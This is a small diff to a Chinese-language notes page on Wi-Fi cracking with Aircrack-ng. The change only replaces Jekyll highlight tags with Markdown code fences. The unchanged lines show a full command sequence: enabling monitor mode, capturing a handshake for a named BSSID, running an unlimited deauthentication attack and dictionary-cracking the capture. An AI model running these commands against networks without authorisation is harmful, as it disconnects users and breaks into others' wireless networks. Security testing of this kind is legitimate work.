@@ -20,7 +20,7 @@ key: Aircrack-ng, Wifi, Attack
 7. 利用字典破解 .cap 数据包: aircrack-ng -w <字典名> -b <bssid> 文件名*.cap
 
 ### 样例
-{% highlight shell %}
+```
 iwconfig
 airmon-ng start wlp0s20u1
 iwconfig
@@ -28,4 +28,4 @@ airodump-ng wlp0s20u1mon
 airodump-ng -c 6 --bssid C0:61:18:29:9D:28 -w wifiname wlp0s20u1mon
 aireplay-ng -0 0 -a C0:61:18:29:9D:28 wlp0s20u1mon
 aircrack-ng -w wordlist.txt -b C0:61:18:29:9D:28 wifiname*.cap
-{% endhighlight %}
+```
